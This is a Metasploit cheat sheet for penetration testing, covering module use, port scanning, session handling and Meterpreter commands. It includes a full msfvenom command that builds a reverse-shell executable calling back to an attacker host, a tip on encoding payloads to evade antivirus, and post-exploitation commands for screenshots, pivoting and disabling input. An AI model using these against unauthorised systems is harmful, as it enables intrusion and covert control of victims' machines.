Metasploit:
Basic Commands:
msf > search [regex]: Search for modules using a regular expression.
msf > use exploit/[ExploitPath]: Select an exploit to use.
msf > set PAYLOAD [PayloadPath]: Choose a payload.
msf > show options: Display options for the current module.
msf > set [Option] [Value]: Configure options.
msf > exploit: Launch the exploit.
Useful Auxiliary Modules:
msf > use auxiliary/scanner/portscan/tcp: Scan TCP ports.
msf > set RHOSTS 10.10.10.0/24: Specify target IP range.
msf > run: Execute the scanner.
msf > use auxiliary/gather/dns_enum: Perform DNS Enumeration.
msf > set DOMAIN target.tgt: Set the target domain.
msf > use auxiliary/server/ftp: Start an FTP server.
msf > set FTPROOT /tmp/ftproot: Define the FTP root directory.
msf > use auxiliary/server/socks4: Launch a SOCKS4 proxy server.
msfvenom:
$ msfvenom -p [PayloadPath] -f [FormatType] LHOST=[LocalHost] LPORT=[LocalPort]: Generate a payload.
Example: Create a reverse Meterpreter payload as an executable.
$ msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=10.1.1.1 LPORT=4444 > met.exe: Specific example.
-f exe: Specifies the format as an executable.
-l payloads: List available payloads.
-e [Encoder] -i [EncodeIterations]: Encode the payload to bypass antivirus detection.
Metasploit Meterpreter Commands:
Base Commands:
? / help: Display command summary.
sysinfo: Show system information.
shutdown / reboot: Reboot or shutdown the target system.
File System Commands:
cd, lcd, pwd / getwd, ls: Directory navigation and listing.
cat: View file contents.
download / upload: Transfer files.
mkdir / rmdir: Manage directories.
Process Commands:
getpid, getuid, ps, kill: Process management.
execute: Execute a program.
migrate: Move to a different process.
Network Commands:
ipconfig: Display network configuration.
route: Manage routing table.
portfwd: Forward traffic via the compromised host.
Misc Commands:
idletime: Check how long the GUI has been idle.
screenshot: Capture a screenshot of the target's screen.
uictl [enable/disable] [keyboard/mouse]: Control the target's input devices.
Advanced Metasploit Commands:
msf > setg [Option] [Value]: Set a global option.
msf > save: Save the current configuration.
msf > spool [file]: Log console output to a file.
msf > load [plugin]: Load a plugin.
msf > back: Move back from the current context.
msf > repeat: Repeat the last module execution.
Managing Sessions:
msf > sessions -l: List all active sessions.
msf > sessions -i [SessionID]: Interact with a specific session.
msf > sessions -k [SessionID]: Kill a specific session.
msf > route add [Subnet] [Netmask] [SessionID]: Route traffic through a session.
This enhanced cheat sheet includes a broader range of commands covering basic operations, advanced configurations, session management, and payload manipulation in Metasploit, offering a comprehensive guide for penetration testing.




